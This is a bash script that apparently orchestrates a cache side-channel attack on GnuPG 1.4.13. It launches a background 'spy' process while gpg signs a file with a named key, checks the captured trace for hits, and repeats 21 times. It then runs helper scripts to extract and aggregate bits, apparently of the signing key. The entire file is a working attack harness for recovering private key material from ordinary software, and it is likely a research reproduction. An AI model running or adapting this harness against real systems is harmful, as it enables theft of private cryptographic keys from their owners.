#!/bin/bash

function get_bits(){

	rm -f scripts/hello.txt.gpg
	./spy &
	SPY_PID=$!

	gnupg-1.4.13/g10/gpg --yes --local-user 80B494D8 --sign scripts/hello.txt

	wait $SPY_PID

	grep ",1" spy.csv >/dev/null
	GREP_EXIT_CODE=$?
	if [[ $GREP_EXIT_CODE -eq 0 ]];
	then
		echo "Sucess! (hits detected)"
	else
		echo "Error! (no hits)"
		exit
	fi

	scripts/bits.py spy.csv
}

rm -f scripts/bits.csv

for i in {1..21}
do
	get_bits
done

./scripts/stats.py scripts/bits.csv
